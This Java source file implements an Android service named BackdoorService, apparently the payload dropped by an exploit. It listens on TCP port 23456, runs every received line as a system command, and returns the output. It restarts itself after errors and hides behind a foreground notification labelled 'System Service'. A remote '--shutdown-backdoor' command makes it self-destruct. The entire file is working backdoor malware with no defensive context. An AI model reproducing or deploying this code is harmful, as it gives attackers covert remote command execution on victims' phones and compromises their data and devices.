package com.example.abxoverflow.droppedapk;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BackdoorService extends Service {
    private static final int PORT = 23456;
    private ServerSocket serverSocket;
    private volatile boolean isRunning = true;
    private volatile boolean isShutdown = false;
    private ExecutorService workerPool = Executors.newFixedThreadPool(4);

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, createNotification());
        new Thread(this::startListening).start();
    }

    private void startListening() {
        while (isRunning && !isShutdown) {
            try {
                if (serverSocket == null || serverSocket.isClosed()) {
                    serverSocket = new ServerSocket(PORT);
                    android.util.Log.d("Backdoor", "Server listening on port " + PORT);
                }
                Socket client = serverSocket.accept();
                client.setSoTimeout(60000);
                workerPool.execute(new CommandHandler(client));
            } catch (Exception e) {
                // 发生错误时自动重启服务
                closeServerSocket();
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void closeServerSocket() {
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("backdoor_channel", "Backdoor", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        return new Notification.Builder(this, "backdoor_channel")
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
    }

    // 自毁方法
    private synchronized void performShutdown() {
        if (isShutdown) return;
        isShutdown = true;
        isRunning = false;
        closeServerSocket();
        workerPool.shutdownNow();
        stopForeground(true);
        stopSelf();
        android.util.Log.d("Backdoor", "Service permanently shut down.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        closeServerSocket();
        workerPool.shutdownNow();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // 命令处理器
    private class CommandHandler implements Runnable {
        private Socket client;
        public CommandHandler(Socket client) { this.client = client; }

        @Override
        public void run() {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                 PrintWriter writer = new PrintWriter(client.getOutputStream(), true)) {
                String command;
                while ((command = reader.readLine()) != null) {
                    if ("--shutdown-backdoor".equalsIgnoreCase(command.trim())) {
                        writer.println("Shutting down backdoor...");
                        performShutdown();
                        break;
                    }
                    // 执行命令并返回结果
                    String result = executeCommand(command);
                    writer.println(result);
                    writer.println("=== END ===");
                }
            } catch (Exception e) {
                android.util.Log.e("Backdoor", "Handler error", e);
            }
        }

        private String executeCommand(String cmd) {
            StringBuilder output = new StringBuilder();
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
            } catch (Exception e) {
                output.append("Error: ").append(e.getMessage());
            }
            return output.toString();
        }
    }
}
